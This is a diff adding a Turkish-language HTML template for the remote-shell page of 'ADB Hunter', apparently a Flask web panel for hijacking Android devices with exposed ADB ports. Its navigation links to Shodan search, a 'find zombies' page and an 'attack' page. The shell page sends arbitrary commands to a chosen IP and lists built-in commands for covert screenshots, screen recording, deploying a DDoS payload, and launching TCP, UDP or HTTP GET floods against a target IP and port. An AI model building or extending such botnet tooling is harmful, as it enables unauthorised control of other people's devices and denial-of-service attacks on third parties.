@@ -1,0 +1,323 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <link rel="icon" type="image/svg" href="{{url_for('static', filename='images/logo.svg')}}">
+    <title>ADB Hunter</title>
+
+    <script src="{{url_for('static', filename='jquery.js')}}"></script>
+    <script src="{{url_for('static', filename='popper.min.js')}}"></script>
+    <script src="{{url_for('static', filename='bootstrap.min.js')}}"></script>
+    <link rel="stylesheet" href="{{url_for('static', filename='bootstrap.min.css')}}">
+    <link rel="stylesheet" href="{{url_for('static', filename='style.css')}}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script>
+        function hide_all() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            var z = document.getElementById("error_box_blank");
+            z.style.display = "none"
+        }
+        function show_error() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            var z = document.getElementById("error_box_blank");
+            z.style.display = "none"
+
+            x.style.display = "block";
+        }
+
+        function show_success() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            var z = document.getElementById("error_box_blank");
+            z.style.display = "none"
+
+            y.style.display = "block";
+        }
+
+        function show_blank_error() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            var z = document.getElementById("error_box_blank");
+            z.style.display = "none"
+
+            z.style.display = "block";
+        }
+
+        function is_ip(ipaddress) 
+        {
+            if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ipaddress))
+            {
+                return (true)
+            }
+            return (false)
+        }
+
+        var current_index = 0;
+        var command_history = []
+        var connected = false;
+        function adb_connect(){
+            hide_all()
+            scroll_to = document.getElementById("scrollto")
+            shell_log = document.getElementById("shell_log")
+            shell_overflow = document.getElementById("shell-overflow")
+            ip_input = document.getElementById("ip_address_input")
+            if (!is_ip(ip_input.value.trim())) {
+                show_blank_error();
+                return;
+            }
+
+            var xhttp = new XMLHttpRequest();
+            xhttp.timeout = 3500;
+            xhttp.ontimeout = function (e) {
+                console.log("Timeout");
+                show_error();
+            };
+            xhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    if (this.responseText == "OK"){  
+                        connected = true;
+                        shell_log.innerHTML = "[+] " + ip_input.value.trim() + " adresiyle bağlantı sağlandı!" + 
+                        "<br>[+] Özel shell komutlarını listelemek için 'help' yazın.";
+                        shell_overflow.scrollTop = shell_overflow.scrollHeight;
+                        show_success();
+                        setTimeout(() => {
+                            scroll_to.scrollIntoView({
+                                block: "end",
+                                behavior: 'smooth'
+                            });
+                        }, 500)
+                    } else {
+                        console.log(this.responseText)
+                        show_error();
+                    }
+                }
+            };
+            xhttp.open("POST", "/adb_connect/", true);
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.send("ip=" + ip_input.value.trim());
+        }
+
+        function escapeHtml(unsafe) {
+            return unsafe
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;")
+            .split(" ").join("&nbsp;")
+            .split("\n").join("<br>");
+        }
+
+        function adb_send(){
+            ip_input = document.getElementById("ip_address_input");
+            shell_overflow = document.getElementById("shell-overflow");
+            command_input = document.getElementById("command_input");
+            shell_log = document.getElementById("shell_log");
+            command = command_input.value;
+            command_input.value = "";
+            command_history.push(command);
+            current_index++;
+            console.log(command_history);
+            shell_log.innerHTML += "<br> $ " + escapeHtml(command);
+            shell_overflow.scrollTop = shell_overflow.scrollHeight;
+            if (command.trim() == "" || !connected) {
+                return;
+            } else if (command == "clear"){
+                shell_log.innerHTML = "";
+                shell_overflow.scrollTop = shell_overflow.scrollHeight;
+                return;
+            } else if (command == "help"){
+                shell_log.innerHTML += escapeHtml("\n[+] Özel Shell Komutları" +
+                "\n\n[*] screenshot: Ekranın fotoğrafını çeker." + 
+                "\n[*] screenvideo <saniye>: Ekran kaydı alır" +
+                "\n[*] deploy-payload: DDoS özelliklerini yükler." + 
+                "\n[*] start-ddos <TCPFLOOD|UDPFLOOD|GETFLOOD> <thread başı gönderilecek paket sayısı> <Oluşturulacak thread sayısı> <IP> <PORT>: DDoS saldırısı başlatır." +
+                "\n[*] stop-ddos: Bütün DDoS saldırılarını durdurur");
+                shell_overflow.scrollTop = shell_overflow.scrollHeight;
+                return;
+            }
+
+            if (command.startsWith("screenvideo") || command.startsWith("screenshot")){
+                shell_log.innerHTML += escapeHtml("\n[+] Kayıt işlemi başladı! İşlem bitince haber verilecektir!")
+            } else if (command.startsWith("deploy-payload")){
+                shell_log.innerHTML += escapeHtml("\n[+] Payload yükleniyor! İşlem bitince haber verilecektir!")
+            }
+            
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    if (this.responseText == "NOT OK"){  
+                        console.log(this.responseText)
+                        shell_log.innerHTML += "<br>[-] Komut başarısız konsolları kontrol edin!";
+                        shell_overflow.scrollTop = shell_overflow.scrollHeight;
+                    } else {
+                        shell_log.innerHTML += "<br>" + escapeHtml(this.responseText)
+                        shell_overflow.scrollTop = shell_overflow.scrollHeight;
+                    }
+                }
+            };
+            xhttp.open("POST", "/adb_send/", true);
+            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+            xhttp.send("ip=" + ip_input.value.trim() + "&command=" + command);
+        }    
+
+        function onLoad(){
+            command_input = document.getElementById("command_input")
+            command_input.addEventListener("keyup", function(event) {
+                if (event.keyCode === 13) {
+                    // enter
+                    event.preventDefault();
+                    adb_send()
+                } else if (event.keyCode == 38){
+                    // up arrow
+                    
+                } else if (event.keyCode == 40) {
+                    //down arrow
+
+                }
+            }); 
+        }
+    </script>
+
+</head>
+
+<body onload="onLoad()">
+    <!-----Navbar------>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+        <a class="navbar-brand" href="/"><img class="logo" src="{{url_for('static', filename='images/logo.svg')}}"></a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#nav_bar" aria-controls="nav_bar" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="nav_bar">
+            <ul class="navbar-nav mr-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>&nbsp;&nbsp;Anasayfa</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/shodan"><i class="fa fa-sliders" aria-hidden="true"></i>&nbsp;&nbsp;Shodan Ayarları</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/zombies"><i class="fa fa-users" aria-hidden="true"></i>&nbsp;&nbsp;Zombileri Bul</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link active" href="/shell"><i class="fa fa-terminal" aria-hidden="true"></i>&nbsp;&nbsp;Shell Aç<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/ddos"><i class="fa fa-bullseye" aria-hidden="true"></i>&nbsp;&nbsp;Saldır</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container" id="error_box" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-danger">Hata Gerçekleşti!</div>
+            <div class="card-body">
+                <h4 class="card-title">Bağlantı Kurulurken Hata Gerçekleşti!</h4>
+                <p class="card-text">Hata mesajını görüntülemek için konsolu ve python konsolunu kontrol edin.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="error_box_blank" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-danger">Hata Gerçekleşti!</div>
+            <div class="card-body">
+                <h4 class="card-title">Bağlantı Kurulurken Hata Gerçekleşti!</h4>
+                <p class="card-text">Doğru bir IP adresi girilmedi! Kutucuğu kontrol edin.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="success_box" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-success">Başarılı!</div>
+            <div class="card-body">
+                <h4 class="card-title">Bağlantı Sağlandı!</h4>
+                <p class="card-text">Artık makineye istediğinizi yaptırabilirsiniz!</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" style="width: 100%; margin-top: 3%">
+        <div class="card border-secondary mb-2">
+            <div class="card-header card-header-primary">Shell Ayarları</div>
+            <div class="card-body">
+                <div class="form-group">
+                    <label class="control-label">IP Adresi</label>
+                    <div class="form-group">
+                        <input type="text" class="form-control" id="ip_address_input" aria-label="API Anahtarı" style="margin-bottom:2%" value="{{ip}}">
+                        <button type="button" class="btn btn-primary btn-lg btn-block" onclick="adb_connect()">Bağlan!</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="collapse navbar-collapse" id="nav_bar">
+            <ul class="navbar-nav mr-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>&nbsp;&nbsp;Anasayfa</a>
+                </li>
+                <li class="nav-item active">
+                    <a class="nav-link" href="/shodan"><i class="fa fa-sliders" aria-hidden="true"></i>&nbsp;&nbsp;Shodan Ayarları<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/zombies"><i class="fa fa-users" aria-hidden="true"></i>&nbsp;&nbsp;Zombileri Bul</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/shell"><i class="fa fa-terminal" aria-hidden="true"></i></i>&nbsp;&nbsp;Shell Aç</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container" style="width: 100%; margin-top: 3%">
+        <div class="card border-secondary mb-2">
+            <div class="card-header card-header-primary">Shell Bağlantısı</div>
+            <div class="card-body">
+                <div class="form-group">
+                    <div class="form-group">
+                        <div class="jumbotron shell-bg shell-log overflow-auto" id="shell-overflow">
+                        <p id="shell_log" style="padding: 15px">[*] Bağlantı kurmak için bağlana basın!</p>
+                        </div>
+                        <div class="input-group mb-3">
+                            <div class="input-group-prepend">
+                                <span class="input-group-text shell-bg">$</span>
+                            </div>
+                            <input type="text" id="command_input" class="form-control  shell-bg" aria-label="Komut">
+                            <div class="input-group-append">
+                                <button type="button" class="btn btn-primary" onclick="adb_send()">Gönder</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="scrollto"></div>
+
+</body>
+
+</html>
